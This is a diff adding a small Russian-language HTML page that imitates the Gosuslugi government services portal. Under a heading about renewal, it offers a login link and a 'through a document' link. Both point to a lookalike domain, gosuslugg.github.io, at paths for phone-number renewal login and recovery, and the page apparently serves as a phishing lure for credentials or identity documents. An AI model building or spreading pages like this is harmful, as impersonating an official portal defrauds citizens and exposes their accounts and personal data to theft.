@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Аунтефикация</title>
+    <style>
+        body {
+            background-color: #eaf3f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Verdana, sans-serif;
+            position: relative;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 50px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.5);
+            text-align: center;
+            position: relative;
+            width: 300px;
+            max-width: 80%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .header {
+            width: 100px;
+            height: auto;
+            transform: scale(1.0);
+            margin-bottom: 10px;
+        }
+        h2 {
+            text-align: center;
+            margin-top: 10px;
+            font-weight: bold;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        .logo {
+            margin-top: 10px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .logo img {
+            width: 100px; /* Размер логотипа */
+            height: auto;
+        }
+        .alternative-login {
+            font-size: 14px;
+            color: gray;
+            margin-top: 10px;
+            opacity: 90%;
+        }
+        .document-caption {
+            margin-top: 20px;
+            font-size: 16px;
+            color: blue; /* Цвет синий */
+            cursor: pointer; /* Курсор при наведении */
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar"></div>
+    <div class="container">
+        <h2>Продление через:</h2>
+        <a class="logo" href="https://gosuslugg.github.io/prodlenie-nomera-login/" target="_blank">
+            <img class="header" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Gosuslugi.png/150px-Gosuslugi.png" alt="Логотип Госуслуг">
+        </a>
+        <span class="alternative-login">Или</span>
+        <a class="document-caption" href="https://gosuslugg.github.io/recovery/" target="_blank">Через документ</a> <!-- Обновленная ссылка -->
+    </div>
+    <div class="bottom-bar"></div>
+</body>
+</html>
